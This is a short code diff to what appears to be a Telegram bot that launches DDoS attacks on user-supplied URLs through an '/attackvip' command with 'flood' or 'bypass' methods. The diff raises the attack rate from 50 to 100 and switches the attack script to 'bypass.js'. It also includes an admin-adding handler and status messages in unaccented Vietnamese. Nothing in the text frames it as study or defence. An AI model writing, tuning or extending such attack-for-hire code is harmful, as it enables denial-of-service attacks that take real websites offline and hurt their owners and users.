@@ -75,10 +75,10 @@ bot.onText(/\/attackvip (https?:\/\/[^\s]+) (\d+) (flood|bypass)/, (msg, match) 
   const duration = parseInt(match[2]);
   const method = match[3];
 
-  const rate = '50';
+  const rate = '100';
   const thread = '9';
   const proxy = '9.txt';
-  const scriptPath = path.join(__dirname, 'c.js');
+  const scriptPath = path.join(__dirname, 'bypass.js');
 
   bot.sendMessage(chatId, `✨ VIP Attack bat đau vao ${url} | Method: ${method} | Time: ${duration}s`);
 
@@ -125,6 +125,7 @@ bot.onText(/\/add (\d+)/, (msg, match) => {
   ADMIN_IDS.push(newAdminId);
   bot.sendMessage(chatId, `✅ Đa them admin moi voi ID: ${newAdminId}`);
 });
+
 
 
 
